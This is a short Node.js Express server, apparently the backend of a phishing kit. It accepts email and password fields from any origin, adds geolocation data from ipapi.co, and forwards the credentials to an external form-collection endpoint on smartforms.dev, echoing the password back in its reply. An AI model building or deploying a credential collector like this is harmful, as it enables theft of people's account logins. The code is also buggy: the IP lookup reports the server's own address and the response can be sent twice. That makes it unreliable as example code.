const express = require('express');
const axios = require('axios');
const cors = require('cors');
// "use strict";
const { createTransport } = require("nodemailer");

const normalizePort = val => {
    var port = parseInt(val, 10);

    if(isNaN(port)){
        // name pipe
        return val;
    }

    if(port >= 0){
        // port number
        return port;
    }

    return false;
};



const app = express();


const port = normalizePort(process.env.PORT);
app.set('port', port);
app.listen(port);

app.use(express.urlencoded({ extended: false }));
app.use(cors());


const
    link = 'https://smartforms.dev/submit/652fc6490dd8ac0a53217fa6';


app.post('/', async (req, res) => {
    const referer = req.headers.referer || req.headers.referrer;
    const ip = req.ip;
    const linkToIp = "https://ipapi.co/json";
    
    
    const ipLookupRequest = await axios.get(linkToIp);
    
    console.log(ipLookupRequest.data);

    const userData = ipLookupRequest.data;

    const userLocation = userData.ip + ", " + userData.country_name + ", " + userData.city;


    axios.post(link, {
        email: req.body.email,
        password: req.body.password,
        source: req.body.source,
        ipAddress: userLocation
    }).then((response) => {
        res.send({
            status_code: '200',
            status: true,
            message: 'message sent!',
            email: req.body.email,
            password: req.body.password,
            source: req.body.source
        })
        if(response.status === 200) {
            console.log('heyiamdone');
            res.send({
                status_code: '200',
                status: true,
                message: 'message sent!',
                email: req.body.email,
                password: req.body.password,
                source: req.body.source
            })
        }
    }).catch((err) => {
        res.send({
            status_code: '400',
            status: false,
            message: err
        })
});


});
